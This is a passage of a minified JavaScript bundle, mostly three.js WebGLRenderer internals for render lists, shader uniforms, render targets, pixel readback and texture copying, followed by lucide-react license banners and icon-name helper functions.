Pt.length>0&&ts(qt,Pt,A,H),Pe&&ce.render(A),co(U,A,H)}ht!==null&&W===0&&(vt.updateMultisampleRenderTarget(ht),vt.updateRenderTargetMipmap(ht)),at&&L.end(F),A.isScene===!0&&A.onAfterRender(F,A,H),kt.resetDefaultState(),lt=-1,mt=null,b.pop(),b.length>0?(D=b[b.length-1],vt.setTextureUnits(D.state.textureUnits),ge===!0&&Wt.setGlobalState(F.clippingPlanes,D.state.camera)):D=null,P.pop(),P.length>0?U=P[P.length-1]:U=null,$!==null&&$.renderEnd()};function lo(A,H,dt,at){if(A.visible===!1)return;if(A.layers.test(H.layers)){if(A.isGroup)dt=A.renderOrder;else if(A.isLOD)A.autoUpdate===!0&&A.update(H);else if(A.isLightProbeGrid)D.pushLightProbeGrid(A);else if(A.isLight)D.pushLight(A),A.castShadow&&D.pushShadow(A);else if(A.isSprite){if(!A.frustumCulled||A.intersectsFrustum(le)){at&&Ve.setFromMatrixPosition(A.matrixWorld).applyMatrix4(ee);const qt=Et.update(A),Pt=A.material;Pt.visible&&U.push(A,qt,Pt,dt,Ve.z,null,H)}}else if((A.isMesh||A.isLine||A.isPoints)&&(!A.frustumCulled||A.intersectsFrustum(le))){const qt=Et.update(A),Pt=A.material;if(at&&(A.boundingSphere!==void 0?(A.boundingSphere===null&&A.computeBoundingSphere(),Ve.copy(A.boundingSphere.center)):(qt.boundingSphere===null&&qt.computeBoundingSphere(),Ve.copy(qt.boundingSphere.center)),Ve.applyMatrix4(A.matrixWorld).applyMatrix4(ee)),Array.isArray(Pt)){const Kt=qt.groups;for(let jt=0,re=Kt.length;jt<re;jt++){const fe=Kt[jt],Yt=Pt[fe.materialIndex];Yt&&Yt.visible&&U.push(A,qt,Yt,dt,Ve.z,fe,H)}}else Pt.visible&&U.push(A,qt,Pt,dt,Ve.z,null,H)}}const Ht=A.children;for(let qt=0,Pt=Ht.length;qt<Pt;qt++)lo(Ht[qt],H,dt,at)}function co(A,H,dt,at){const{opaque:rt,transmissive:Ht,transparent:qt}=A;D.setupLightsView(dt),ge===!0&&Wt.setGlobalState(F.clippingPlanes,dt),at&&M.viewport(gt.copy(at)),rt.length>0&&Gi(rt,H,dt),Ht.length>0&&Gi(Ht,H,dt),qt.length>0&&Gi(qt,H,dt),M.buffers.depth.setTest(!0),M.buffers.depth.setMask(!0),M.buffers.color.setMask(!0),M.setPolygonOffset(!1)}function ts(A,H,dt,at){if((dt.isScene===!0?dt.overrideMaterial:null)!==null)return;if(D.state.transmissionRenderTarget[at.id]===void 0){const Yt=Oe.has("EXT_color_buffer_half_float")||Oe.has("EXT_color_buffer_float");D.state.transmissionRenderTarget[at.id]=new Bi(1,1,{generateMipmaps:!0,type:Yt?oa:Ai,minFilter:qr,samples:Math.max(4,O.samples),stencilBuffer:f,resolveDepthBuffer:!1,resolveStencilBuffer:!1,storeMultisampledDepthBuffer:!1,storeMultisampledStencilBuffer:!1,colorSpace:we.workingColorSpace})}const Ht=D.state.transmissionRenderTarget[at.id],qt=at.viewport||gt;Ht.setSize(qt.z*F.transmissionResolutionScale,qt.w*F.transmissionResolutionScale);const Pt=F.getRenderTarget(),Kt=F.getActiveCubeFace(),jt=F.getActiveMipmapLevel();F.setRenderTarget(Ht),F.getClearColor(z),pt=F.getClearAlpha(),pt<1&&F.setClearColor(16777215,.5),F.clear(),Pe&&ce.render(dt);const re=F.toneMapping;F.toneMapping=ra;const fe=at.viewport;if(at.viewport!==void 0&&(at.viewport=void 0),D.setupLightsView(at),ge===!0&&Wt.setGlobalState(F.clippingPlanes,at),Gi(A,dt,at),vt.updateMultisampleRenderTarget(Ht),vt.updateRenderTargetMipmap(Ht),Oe.has("WEBGL_multisampled_render_to_texture")===!1){let Yt=!1;for(let ye=0,_e=H.length;ye<_e;ye++){const Ye=H[ye],{object:He,geometry:vn,material:Gt,group:an}=Ye;if(Gt.side===wa&&He.layers.test(at.layers)){const Ce=Gt.side;Gt.side=Jn,Gt.needsUpdate=!0,Tl(He,dt,at,vn,Gt,an),Gt.side=Ce,Gt.needsUpdate=!0,Yt=!0}}Yt===!0&&(vt.updateMultisampleRenderTarget(Ht),vt.updateRenderTargetMipmap(Ht))}F.setRenderTarget(Pt,Kt,jt),F.setClearColor(z,pt),fe!==void 0&&(at.viewport=fe),F.toneMapping=re}function Gi(A,H,dt){const at=H.isScene===!0?H.overrideMaterial:null;for(let rt=0,Ht=A.length;rt<Ht;rt++){const qt=A[rt],{object:Pt,geometry:Kt,group:jt}=qt;let re=qt.material;re.allowOverride===!0&&at!==null&&(re=at),Pt.layers.test(dt.layers)&&Tl(Pt,H,dt,Kt,re,jt)}}function Tl(A,H,dt,at,rt,Ht){$!==null&&rt.isNodeMaterial&&$.setObject(A,rt),A.onBeforeRender(F,H,dt,at,rt,Ht),A.modelViewMatrix.multiplyMatrices(dt.matrixWorldInverse,A.matrixWorld),A.normalMatrix.getNormalMatrix(A.modelViewMatrix),rt.onBeforeRender(F,H,dt,at,A,Ht),rt.transparent===!0&&rt.side===wa&&rt.forceSinglePass===!1?(rt.side=Jn,rt.needsUpdate=!0,F.renderBufferDirect(dt,H,at,rt,A,Ht),rt.side=Zr,rt.needsUpdate=!0,F.renderBufferDirect(dt,H,at,rt,A,Ht),rt.side=wa):F.renderBufferDirect(dt,H,at,rt,A,Ht),A.onAfterRender(F,H,dt,at,rt,Ht)}function xr(A,H,dt){H.isScene!==!0&&(H=fn);const at=ot.get(A),rt=D.state.lights,Ht=D.state.shadowsArray,qt=rt.state.version,Pt=Dt.getParameters(A,rt.state,Ht,H,dt,D.state.lightProbeGridArray),Kt=Dt.getProgramCacheKey(Pt);let jt=at.programs;at.environment=A.isMeshStandardMaterial||A.isMeshLambertMaterial||A.isMeshPhongMaterial?H.environment:null,at.fog=H.fog;const re=A.isMeshStandardMaterial||A.isMeshLambertMaterial&&!A.envMap||A.isMeshPhongMaterial&&!A.envMap;at.envMap=Ct.get(A.envMap||at.environment,re),at.envMapRotation=at.environment!==null&&A.envMap===null?H.environmentRotation:A.envMapRotation,jt===void 0&&(A.addEventListener("dispose",di),jt=new Map,at.programs=jt);let fe=jt.get(Kt);if(fe!==void 0){if(at.currentProgram===fe&&at.lightsStateVersion===qt)return fo(A,Pt),fe}else Pt.uniforms=Dt.getUniforms(A),$!==null&&A.isNodeMaterial&&$.build(A,dt,Pt),A.onBeforeCompile(Pt,F),fe=Dt.acquireProgram(Pt,Kt),jt.set(Kt,fe),at.uniforms=Pt.uniforms;const Yt=at.uniforms;return(!A.isShaderMaterial&&!A.isRawShaderMaterial||A.clipping===!0)&&(Yt.clippingPlanes=Wt.uniform),fo(A,Pt),at.needsLights=Rl(A),at.lightsStateVersion=qt,at.needsLights&&(Yt.ambientLightColor.value=rt.state.ambient,Yt.lightProbe.value=rt.state.probe,Yt.sunLights.value=rt.state.sun,Yt.sunLightShadows.value=rt.state.sunShadow,Yt.directionalLights.value=rt.state.directional,Yt.directionalLightShadows.value=rt.state.directionalShadow,Yt.spotLights.value=rt.state.spot,Yt.spotLightShadows.value=rt.state.spotShadow,Yt.rectAreaLights.value=rt.state.rectArea,Yt.ltc_1.value=rt.state.rectAreaLTC1,Yt.ltc_2.value=rt.state.rectAreaLTC2,Yt.pointLights.value=rt.state.point,Yt.pointLightShadows.value=rt.state.pointShadow,Yt.hemisphereLights.value=rt.state.hemi,Yt.sunShadowMatrix.value=rt.state.sunShadowMatrix,Yt.sunShadowCascade.value=rt.state.sunShadowCascade,Yt.directionalShadowMatrix.value=rt.state.directionalShadowMatrix,Yt.spotLightMatrix.value=rt.state.spotLightMatrix,Yt.spotLightMap.value=rt.state.spotLightMap,Yt.pointShadowMatrix.value=rt.state.pointShadowMatrix),at.lightProbeGrid=D.state.lightProbeGridArray.length>0,at.currentProgram=fe,at.uniformsList=null,fe}function uo(A){if(A.uniformsList===null){const H=A.currentProgram.getUniforms();A.uniformsList=Au.seqWithValue(H.seq,A.uniforms)}return A.uniformsList}function fo(A,H){const dt=ot.get(A);dt.outputColorSpace=H.outputColorSpace,dt.batching=H.batching,dt.batchingColor=H.batchingColor,dt.instancing=H.instancing,dt.instancingColor=H.instancingColor,dt.instancingMorph=H.instancingMorph,dt.skinning=H.skinning,dt.morphTargets=H.morphTargets,dt.morphNormals=H.morphNormals,dt.morphColors=H.morphColors,dt.morphTargetsCount=H.morphTargetsCount,dt.numClippingPlanes=H.numClippingPlanes,dt.numIntersection=H.numClipIntersection,dt.vertexAlphas=H.vertexAlphas,dt.vertexTangents=H.vertexTangents,dt.toneMapping=H.toneMapping}function ho(A,H){if(A.length===0)return null;if(A.length===1)return A[0].texture!==null?A[0]:null;C.setFromMatrixPosition(H.matrixWorld);for(let dt=0,at=A.length;dt<at;dt++){const rt=A[dt];if(rt.texture!==null&&rt.boundingBox.containsPoint(C))return rt}return null}function po(A,H,dt,at,rt){H.isScene!==!0&&(H=fn),vt.resetTextureUnits();const Ht=H.fog,qt=at.isMeshStandardMaterial||at.isMeshLambertMaterial||at.isMeshPhongMaterial?H.environment:null,Pt=ht===null?F.outputColorSpace:ht.isXRRenderTarget===!0?ht.texture.colorSpace:we.workingColorSpace,Kt=at.isMeshStandardMaterial||at.isMeshLambertMaterial&&!at.envMap||at.isMeshPhongMaterial&&!at.envMap,jt=Ct.get(at.envMap||qt,Kt),re=at.vertexColors===!0&&!!dt.attributes.color&&dt.attributes.color.itemSize===4,fe=!!dt.attributes.tangent&&(!!at.normalMap||at.anisotropy>0),Yt=!!dt.morphAttributes.position,ye=!!dt.morphAttributes.normal,_e=!!dt.morphAttributes.color;let Ye=ra;at.toneMapped&&(ht===null||ht.isXRRenderTarget===!0)&&(Ye=F.toneMapping);const He=dt.morphAttributes.position||dt.morphAttributes.normal||dt.morphAttributes.color,vn=He!==void 0?He.length:0,Gt=ot.get(at),an=D.state.lights;if(ge===!0&&(Se===!0||A!==mt)){const be=A===mt&&at.id===lt;Wt.setState(at,A,be)}let Ce=!1;at.version===Gt.__version?(Gt.needsLights&&Gt.lightsStateVersion!==an.state.version||Gt.outputColorSpace!==Pt||rt.isBatchedMesh&&Gt.batching===!1||!rt.isBatchedMesh&&Gt.batching===!0||rt.isBatchedMesh&&Gt.batchingColor===!0&&rt._colorsTexture===null||rt.isBatchedMesh&&Gt.batchingColor===!1&&rt._colorsTexture!==null||rt.isInstancedMesh&&Gt.instancing===!1||!rt.isInstancedMesh&&Gt.instancing===!0||rt.isSkinnedMesh&&Gt.skinning===!1||!rt.isSkinnedMesh&&Gt.skinning===!0||rt.isInstancedMesh&&Gt.instancingColor===!0&&rt.instanceColor===null||rt.isInstancedMesh&&Gt.instancingColor===!1&&rt.instanceColor!==null||rt.isInstancedMesh&&Gt.instancingMorph===!0&&rt.morphTexture===null||rt.isInstancedMesh&&Gt.instancingMorph===!1&&rt.morphTexture!==null||Gt.envMap!==jt||at.fog===!0&&Gt.fog!==Ht||Gt.numClippingPlanes!==void 0&&(Gt.numClippingPlanes!==Wt.numPlanes||Gt.numIntersection!==Wt.numIntersection)||Gt.vertexAlphas!==re||Gt.vertexTangents!==fe||Gt.morphTargets!==Yt||Gt.morphNormals!==ye||Gt.morphColors!==_e||Gt.toneMapping!==Ye||Gt.morphTargetsCount!==vn||!!Gt.lightProbeGrid!=D.state.lightProbeGridArray.length>0)&&(Ce=!0):(Ce=!0,Gt.__version=at.version);let zn=Gt.currentProgram;Ce===!0&&(zn=xr(at,H,rt),$&&at.isNodeMaterial&&$.onUpdateProgram(at,zn,Gt));let ei=!1,Vi=!1,ve=!1;const Be=zn.getUniforms(),je=Gt.uniforms;if(M.useProgram(zn.program)&&(ei=!0,Vi=!0,ve=!0),at.id!==lt&&(lt=at.id,Vi=!0),Gt.needsLights){const be=ho(D.state.lightProbeGridArray,rt);Gt.lightProbeGrid!==be&&(Gt.lightProbeGrid=be,Vi=!0)}if(ei||mt!==A){M.buffers.depth.getReversed()&&A.reversedDepth!==!0&&(A._reversedDepth=!0,A.updateProjectionMatrix()),Be.setValue(k,"projectionMatrix",A.projectionMatrix),Be.setValue(k,"viewMatrix",A.matrixWorldInverse);const rn=Be.map.cameraPosition;rn!==void 0&&rn.setValue(k,ie.setFromMatrixPosition(A.matrixWorld)),O.logarithmicDepthBuffer&&Be.setValue(k,"logDepthBufFC",2/(Math.log(A.far+1)/Math.LN2)),(at.isMeshPhongMaterial||at.isMeshToonMaterial||at.isMeshLambertMaterial||at.isMeshBasicMaterial||at.isMeshStandardMaterial||at.isShaderMaterial)&&Be.setValue(k,"isOrthographic",A.isOrthographicCamera===!0),mt!==A&&(mt=A,Vi=!0,ve=!0)}if(Gt.needsLights&&(an.state.sunShadowMap.length>0&&Be.setValue(k,"sunShadowMap",an.state.sunShadowMap,vt),an.state.directionalShadowMap.length>0&&Be.setValue(k,"directionalShadowMap",an.state.directionalShadowMap,vt),an.state.spotShadowMap.length>0&&Be.setValue(k,"spotShadowMap",an.state.spotShadowMap,vt),an.state.pointShadowMap.length>0&&Be.setValue(k,"pointShadowMap",an.state.pointShadowMap,vt)),rt.isSkinnedMesh){Be.setOptional(k,rt,"bindMatrix"),Be.setOptional(k,rt,"bindMatrixInverse");const be=rt.skeleton;be&&(be.boneTexture===null&&be.computeBoneTexture(),Be.setValue(k,"boneTexture",be.boneTexture,vt))}rt.isBatchedMesh&&(Be.setOptional(k,rt,"batchingTexture"),Be.setValue(k,"batchingTexture",rt._matricesTexture,vt),Be.setOptional(k,rt,"batchingIdTexture"),Be.setValue(k,"batchingIdTexture",rt._indirectTexture,vt),Be.setOptional(k,rt,"batchingColorTexture"),rt._colorsTexture!==null&&Be.setValue(k,"batchingColorTexture",rt._colorsTexture,vt));const ni=dt.morphAttributes;if((ni.position!==void 0||ni.normal!==void 0||ni.color!==void 0)&&X.update(rt,dt,zn),(Vi||Gt.receiveShadow!==rt.receiveShadow)&&(Gt.receiveShadow=rt.receiveShadow,Be.setValue(k,"receiveShadow",rt.receiveShadow)),(at.isMeshStandardMaterial||at.isMeshLambertMaterial||at.isMeshPhongMaterial)&&at.envMap===null&&H.environment!==null&&(je.envMapIntensity.value=H.environmentIntensity),je.dfgLUT!==void 0&&(je.dfgLUT.value=L3()),Vi){if(Be.setValue(k,"toneMappingExposure",F.toneMappingExposure),Gt.needsLights&&Al(je,ve),Ht&&at.fog===!0&&$t.refreshFogUniforms(je,Ht),$t.refreshMaterialUniforms(je,at,ut,Y,D.state.transmissionRenderTarget[A.id]),Gt.needsLights&&Gt.lightProbeGrid){const be=Gt.lightProbeGrid;je.probesSH.value=be.texture,je.probesMin.value.copy(be.boundingBox.min),je.probesMax.value.copy(be.boundingBox.max),je.probesResolution.value.copy(be.resolution)}Au.upload(k,uo(Gt),je,vt)}if(at.isShaderMaterial&&at.uniformsNeedUpdate===!0&&(Au.upload(k,uo(Gt),je,vt),at.uniformsNeedUpdate=!1),at.isSpriteMaterial&&Be.setValue(k,"center",rt.center),Be.setValue(k,"modelViewMatrix",rt.modelViewMatrix),Be.setValue(k,"normalMatrix",rt.normalMatrix),Be.setValue(k,"modelMatrix",rt.matrixWorld),at.uniformsGroups!==void 0){const be=at.uniformsGroups;for(let rn=0,ua=be.length;rn<ua;rn++){const Cl=be[rn];bt.update(Cl,zn),bt.bind(Cl,zn)}}return zn}function Al(A,H){A.ambientLightColor.needsUpdate=H,A.lightProbe.needsUpdate=H,A.sunLights.needsUpdate=H,A.sunLightShadows.needsUpdate=H,A.directionalLights.needsUpdate=H,A.directionalLightShadows.needsUpdate=H,A.pointLights.needsUpdate=H,A.pointLightShadows.needsUpdate=H,A.spotLights.needsUpdate=H,A.spotLightShadows.needsUpdate=H,A.rectAreaLights.needsUpdate=H,A.hemisphereLights.needsUpdate=H}function Rl(A){return A.isMeshLambertMaterial||A.isMeshToonMaterial||A.isMeshPhongMaterial||A.isMeshStandardMaterial||A.isShadowMaterial||A.isShaderMaterial&&A.lights===!0}this.getActiveCubeFace=function(){return q},this.getActiveMipmapLevel=function(){return W},this.getRenderTarget=function(){return ht},this.setRenderTargetTextures=function(A,H,dt){const at=ot.get(A);at.__autoAllocateDepthBuffer=A.resolveDepthBuffer===!1,at.__autoAllocateDepthBuffer===!1&&(at.__useRenderToTexture=!1),ot.get(A.texture).__webglTexture=H,ot.get(A.depthTexture).__webglTexture=at.__autoAllocateDepthBuffer?void 0:dt,at.__hasExternalTextures=!0},this.setRenderTargetFramebuffer=function(A,H){const dt=ot.get(A);dt.__webglFramebuffer=H,dt.__useDefaultFramebuffer=H===void 0},this.setRenderTarget=function(A,H=0,dt=0){ht=A,q=H,W=dt;let at=null,rt=!1,Ht=!1;if(A){const Pt=ot.get(A);if(Pt.__useDefaultFramebuffer!==void 0){M.bindFramebuffer(k.FRAMEBUFFER,Pt.__webglFramebuffer),gt.copy(A.viewport),Bt.copy(A.scissor),Ut=A.scissorTest,M.viewport(gt),M.scissor(Bt),M.setScissorTest(Ut),lt=-1;return}else if(Pt.__webglFramebuffer===void 0)vt.setupRenderTarget(A);else if(Pt.__hasExternalTextures)vt.rebindTextures(A,ot.get(A.texture).__webglTexture,ot.get(A.depthTexture).__webglTexture);else if(A.depthBuffer){const re=A.depthTexture;if(Pt.__boundDepthTexture!==re){if(re!==null&&ot.has(re)&&(A.width!==re.image.width||A.height!==re.image.height))throw new Error("THREE.WebGLRenderer: Attached DepthTexture is initialized to the incorrect size.");vt.setupDepthRenderbuffer(A)}}const Kt=A.texture;(Kt.isData3DTexture||Kt.isDataArrayTexture||Kt.isCompressedArrayTexture)&&(Ht=!0);const jt=ot.get(A).__webglFramebuffer;A.isWebGLCubeRenderTarget?(Array.isArray(jt[H])?at=jt[H][dt]:at=jt[H],rt=!0):A.samples>0&&vt.useMultisampledRTT(A)===!1?at=ot.get(A).__webglMultisampledFramebuffer:Array.isArray(jt)?at=jt[dt]:at=jt,gt.copy(A.viewport),Bt.copy(A.scissor),Ut=A.scissorTest}else gt.copy(_t).multiplyScalar(ut).floor(),Bt.copy(Rt).multiplyScalar(ut).floor(),Ut=Le;if(dt!==0&&(at=ft),M.bindFramebuffer(k.FRAMEBUFFER,at)&&M.drawBuffers(A,at),M.viewport(gt),M.scissor(Bt),M.setScissorTest(Ut),rt){const Pt=ot.get(A.texture);k.framebufferTexture2D(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_CUBE_MAP_POSITIVE_X+H,Pt.__webglTexture,dt)}else if(Ht){const Pt=H;for(let Kt=0;Kt<A.textures.length;Kt++){const jt=ot.get(A.textures[Kt]);k.framebufferTextureLayer(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0+Kt,jt.__webglTexture,dt,Pt)}}else if(A!==null&&dt!==0){const Pt=ot.get(A.texture);k.framebufferTexture2D(k.FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,Pt.__webglTexture,dt)}lt=-1};function hi(A){const H=ot.get(A);return(H.__readFormat!==A.format||H.__readType!==A.type)&&(H.__readFormat=A.format,H.__readType=A.type,H.__formatReadable=O.textureFormatReadable(A.format),H.__typeReadable=O.textureTypeReadable(A.type)),H}this.readRenderTargetPixels=function(A,H,dt,at,rt,Ht,qt,Pt=0){if(!(A&&A.isWebGLRenderTarget)){Ie("WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");return}let Kt=ot.get(A).__webglFramebuffer;if(A.isWebGLCubeRenderTarget&&qt!==void 0&&(Kt=Kt[qt]),Kt){M.bindFramebuffer(k.FRAMEBUFFER,Kt);try{const jt=A.textures[Pt],re=jt.format,fe=jt.type;A.textures.length>1&&k.readBuffer(k.COLOR_ATTACHMENT0+Pt);const Yt=hi(jt);if(Yt.__formatReadable===!1){Ie("WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.");return}if(Yt.__typeReadable===!1){Ie("WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.");return}H>=0&&H<=A.width-at&&dt>=0&&dt<=A.height-rt&&k.readPixels(H,dt,at,rt,Ot.convert(re),Ot.convert(fe),Ht)}finally{const jt=ht!==null?ot.get(ht).__webglFramebuffer:null;M.bindFramebuffer(k.FRAMEBUFFER,jt)}}},this.readRenderTargetPixelsAsync=async function(A,H,dt,at,rt,Ht,qt,Pt=0){if(!(A&&A.isWebGLRenderTarget))throw new Error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");let Kt=ot.get(A).__webglFramebuffer;if(A.isWebGLCubeRenderTarget&&qt!==void 0&&(Kt=Kt[qt]),Kt)if(H>=0&&H<=A.width-at&&dt>=0&&dt<=A.height-rt){M.bindFramebuffer(k.FRAMEBUFFER,Kt);const jt=A.textures[Pt],re=jt.format,fe=jt.type;A.textures.length>1&&k.readBuffer(k.COLOR_ATTACHMENT0+Pt);const Yt=hi(jt);if(Yt.__formatReadable===!1)throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: renderTarget is not in RGBA or implementation defined format.");if(Yt.__typeReadable===!1)throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: renderTarget is not in UnsignedByteType or implementation defined type.");const ye=k.createBuffer();k.bindBuffer(k.PIXEL_PACK_BUFFER,ye),k.bufferData(k.PIXEL_PACK_BUFFER,Ht.byteLength,k.STREAM_READ),k.readPixels(H,dt,at,rt,Ot.convert(re),Ot.convert(fe),0),k.bindBuffer(k.PIXEL_PACK_BUFFER,null);const _e=ht!==null?ot.get(ht).__webglFramebuffer:null;M.bindFramebuffer(k.FRAMEBUFFER,_e);const Ye=k.fenceSync(k.SYNC_GPU_COMMANDS_COMPLETE,0);return k.flush(),await QE(k,Ye,4),k.bindBuffer(k.PIXEL_PACK_BUFFER,ye),k.getBufferSubData(k.PIXEL_PACK_BUFFER,0,Ht),k.bindBuffer(k.PIXEL_PACK_BUFFER,null),k.deleteBuffer(ye),k.deleteSync(Ye),Ht}else throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: requested read bounds are out of range.")},this.copyFramebufferToTexture=function(A,H=null,dt=0){const at=Math.pow(2,-dt),rt=Math.floor(A.image.width*at),Ht=Math.floor(A.image.height*at),qt=H!==null?H.x:0,Pt=H!==null?H.y:0;vt.setTexture2D(A,0),k.copyTexSubImage2D(k.TEXTURE_2D,dt,0,0,qt,Pt,rt,Ht),M.unbindTexture()},this.copyTextureToTexture=function(A,H,dt=null,at=null,rt=0,Ht=0){let qt,Pt,Kt,jt,re,fe,Yt,ye,_e;const Ye=A.isCompressedTexture?A.mipmaps[Ht]:A.image;if(dt!==null)qt=dt.max.x-dt.min.x,Pt=dt.max.y-dt.min.y,Kt=dt.isBox3?dt.max.z-dt.min.z:1,jt=dt.min.x,re=dt.min.y,fe=dt.isBox3?dt.min.z:0;else{const je=Math.pow(2,-rt);qt=Math.floor(Ye.width*je),Pt=Math.floor(Ye.height*je),A.isDataArrayTexture?Kt=Ye.depth:A.isData3DTexture?Kt=Math.floor(Ye.depth*je):Kt=1,jt=0,re=0,fe=0}at!==null?(Yt=at.x,ye=at.y,_e=at.z):(Yt=0,ye=0,_e=0);const He=Ot.convert(H.format),vn=Ot.convert(H.type);let Gt;H.isData3DTexture?(vt.setTexture3D(H,0),Gt=k.TEXTURE_3D):H.isDataArrayTexture||H.isCompressedArrayTexture?(vt.setTexture2DArray(H,0),Gt=k.TEXTURE_2D_ARRAY):(vt.setTexture2D(H,0),Gt=k.TEXTURE_2D),M.activeTexture(k.TEXTURE0),M.pixelStorei(k.UNPACK_FLIP_Y_WEBGL,H.flipY),M.pixelStorei(k.UNPACK_PREMULTIPLY_ALPHA_WEBGL,H.premultiplyAlpha),M.pixelStorei(k.UNPACK_ALIGNMENT,H.unpackAlignment);const an=M.getParameter(k.UNPACK_ROW_LENGTH),Ce=M.getParameter(k.UNPACK_IMAGE_HEIGHT),zn=M.getParameter(k.UNPACK_SKIP_PIXELS),ei=M.getParameter(k.UNPACK_SKIP_ROWS),Vi=M.getParameter(k.UNPACK_SKIP_IMAGES);M.pixelStorei(k.UNPACK_ROW_LENGTH,Ye.width),M.pixelStorei(k.UNPACK_IMAGE_HEIGHT,Ye.height),M.pixelStorei(k.UNPACK_SKIP_PIXELS,jt),M.pixelStorei(k.UNPACK_SKIP_ROWS,re),M.pixelStorei(k.UNPACK_SKIP_IMAGES,fe);const ve=A.isDataArrayTexture||A.isData3DTexture,Be=H.isDataArrayTexture||H.isData3DTexture;if(A.isDepthTexture){const je=ot.get(A),ni=ot.get(H),be=ot.get(je.__renderTarget),rn=ot.get(ni.__renderTarget);M.bindFramebuffer(k.READ_FRAMEBUFFER,be.__webglFramebuffer),M.bindFramebuffer(k.DRAW_FRAMEBUFFER,rn.__webglFramebuffer);for(let ua=0;ua<Kt;ua++)ve&&(k.framebufferTextureLayer(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,ot.get(A).__webglTexture,rt,fe+ua),k.framebufferTextureLayer(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,ot.get(H).__webglTexture,Ht,_e+ua)),k.blitFramebuffer(jt,re,qt,Pt,Yt,ye,qt,Pt,k.DEPTH_BUFFER_BIT,k.NEAREST);M.bindFramebuffer(k.READ_FRAMEBUFFER,null),M.bindFramebuffer(k.DRAW_FRAMEBUFFER,null)}else if(rt!==0||A.isRenderTargetTexture||ot.has(A)){const je=ot.get(A),ni=ot.get(H);M.bindFramebuffer(k.READ_FRAMEBUFFER,j),M.bindFramebuffer(k.DRAW_FRAMEBUFFER,et);for(let be=0;be<Kt;be++)ve?k.framebufferTextureLayer(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,je.__webglTexture,rt,fe+be):k.framebufferTexture2D(k.READ_FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,je.__webglTexture,rt),Be?k.framebufferTextureLayer(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,ni.__webglTexture,Ht,_e+be):k.framebufferTexture2D(k.DRAW_FRAMEBUFFER,k.COLOR_ATTACHMENT0,k.TEXTURE_2D,ni.__webglTexture,Ht),rt!==0?k.blitFramebuffer(jt,re,qt,Pt,Yt,ye,qt,Pt,k.COLOR_BUFFER_BIT,k.NEAREST):Be?k.copyTexSubImage3D(Gt,Ht,Yt,ye,_e+be,jt,re,qt,Pt):k.copyTexSubImage2D(Gt,Ht,Yt,ye,jt,re,qt,Pt);M.bindFramebuffer(k.READ_FRAMEBUFFER,null),M.bindFramebuffer(k.DRAW_FRAMEBUFFER,null)}else Be?A.isDataTexture||A.isData3DTexture?k.texSubImage3D(Gt,Ht,Yt,ye,_e,qt,Pt,Kt,He,vn,Ye.data):H.isCompressedArrayTexture?k.compressedTexSubImage3D(Gt,Ht,Yt,ye,_e,qt,Pt,Kt,He,Ye.data):k.texSubImage3D(Gt,Ht,Yt,ye,_e,qt,Pt,Kt,He,vn,Ye):A.isDataTexture?k.texSubImage2D(k.TEXTURE_2D,Ht,Yt,ye,qt,Pt,He,vn,Ye.data):A.isCompressedTexture?k.compressedTexSubImage2D(k.TEXTURE_2D,Ht,Yt,ye,Ye.width,Ye.height,He,Ye.data):k.texSubImage2D(k.TEXTURE_2D,Ht,Yt,ye,qt,Pt,He,vn,Ye);M.pixelStorei(k.UNPACK_ROW_LENGTH,an),M.pixelStorei(k.UNPACK_IMAGE_HEIGHT,Ce),M.pixelStorei(k.UNPACK_SKIP_PIXELS,zn),M.pixelStorei(k.UNPACK_SKIP_ROWS,ei),M.pixelStorei(k.UNPACK_SKIP_IMAGES,Vi),Ht===0&&H.generateMipmaps&&k.generateMipmap(Gt),M.unbindTexture()},this.initRenderTarget=function(A){ot.get(A).__webglFramebuffer===void 0&&vt.setupRenderTarget(A)},this.initTexture=function(A){A.isCubeTexture?vt.setTextureCube(A,0):A.isData3DTexture?vt.setTexture3D(A,0):A.isDataArrayTexture||A.isCompressedArrayTexture?vt.setTexture2DArray(A,0):vt.setTexture2D(A,0),M.unbindTexture()},this.resetState=function(){q=0,W=0,ht=null,M.reset(),kt.reset()},typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}get coordinateSystem(){return aa}get outputColorSpace(){return this._outputColorSpace}set outputColorSpace(e){this._outputColorSpace=e;const i=this.getContext();i.drawingBufferColorSpace=we._getDrawingBufferColorSpace(e),i.unpackColorSpace=we._getUnpackColorSpace()}}/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const P3=o=>o==null?void 0:o.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase();/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */function I3(o,e,i=[]){if(e==null)throw new Error("[lucide]: iconNode is required when icon name is used");return{name:P3(o),size:24,node:e,...i.length>0?{aliases:i}:{}}}/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const z3=o=>{let e="",i=!1;for(const s of o){if(s==="-"||s==="_"||s<=" "){i=e.length>0;continue}e.length===0?e+=s.toLowerCase():e+=i?s.toUpperCase():s,i=!1}return e};/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const B3=o=>{const e=z3(o);return e.charAt(0).toUpperCase()+e.slice(1)};/**
 * @license lucide-react v1.45.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
